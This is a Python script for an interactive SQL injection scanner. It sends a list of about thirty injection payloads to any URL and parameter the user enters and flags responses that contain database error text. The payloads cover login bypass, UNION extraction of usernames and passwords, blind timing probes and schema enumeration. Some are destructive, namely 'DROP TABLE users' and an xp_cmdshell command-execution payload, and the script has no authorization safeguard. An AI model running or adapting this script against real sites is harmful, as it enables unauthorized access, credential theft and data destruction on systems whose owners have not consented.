import requests
from urllib.parse import urlencode

# Comprehensive SQLi payloads including ID=243
SQLI_PAYLOADS = [
    "ID=243",  # Baseline test
    "=1#",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 LIMIT 1--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "' AND 1=0--",
    "' AND 1=1--",
    "' AND EXISTS(SELECT * FROM users)--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--",
    "'; DROP TABLE users;--",
    "'; EXEC xp_cmdshell('dir');--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(1000000,MD5('test'))--",
    "' OR 1 GROUP BY CONCAT(username, password)--",
    "' OR 1 ORDER BY 1--",
    "' OR 1 ORDER BY 100--",
    "' OR 1 HAVING 1=1--",
    "' OR 1 IN (SELECT 1)--",
    "' OR 1 IN (SELECT name FROM users)--",
    "' OR 1 IN (SELECT table_name FROM information_schema.tables)--",
    "' OR 1 IN (SELECT column_name FROM information_schema.columns)--",
    "' OR 1 IN (SELECT version())--",
    "' OR 1 IN (SELECT @@version)--",
    "' OR 1 IN (SELECT user())--",
    "' OR 1 IN (SELECT database())--",
    "' OR 1 IN (SELECT schema_name FROM information_schema.schemata)--"
]

def test_sql_injection(base_url, param_name):
    print(f"\n🔍 Testing SQL injection on: {base_url} using parameter: {param_name}")
    vulnerable = False

    for payload in SQLI_PAYLOADS:
        if "=" in payload and payload.lower().startswith(param_name.lower() + "="):
            query = payload  # Use full key=value pair directly
        else:
            query = urlencode({param_name: payload})
        test_url = f"{base_url}?{query}"
        print(f"\n🔗 Testing URL: {test_url}")

        try:
            response = requests.get(test_url, timeout=5)
            content = response.text.lower()

            if any(keyword in content for keyword in [
                "sql syntax", "mysql", "unclosed quotation", "query failed",
                "syntax error", "warning", "pdo", "odbc", "native client", "invalid query"
            ]):
                print(f"❗ Potential SQLi detected with payload: {payload}")
                vulnerable = True
            else:
                print(f"✅ Safe response for payload: {payload}")
        except Exception as e:
            print(f"⚠️ Error testing payload '{payload}': {e}")

    if vulnerable:
        print("\n🚨 This URL may be vulnerable to SQL injection.")
    else:
        print("\n✅ No obvious SQL injection vulnerabilities detected.")

# Main loop
while True:
    url_input = input("\n🌐 Enter base URL (e.g., https://example.com/page): ").strip()
    param_input = input("🔧 Enter the parameter name to test (e.g., id, user, search): ").strip()

    if not url_input.startswith("http") or not param_input:
        print("⚠️ Please enter a valid URL and parameter name.")
        continue

    try:
        test_sql_injection(url_input, param_input)
    except Exception as e:
        print(f"❌ Error during scan: {e}")

    again = input("\n🔁 Would you like to test another URL? (yes/no): ").strip().lower()
    if again != 'yes':
        print("✅ SQL injection test session ended.")
        break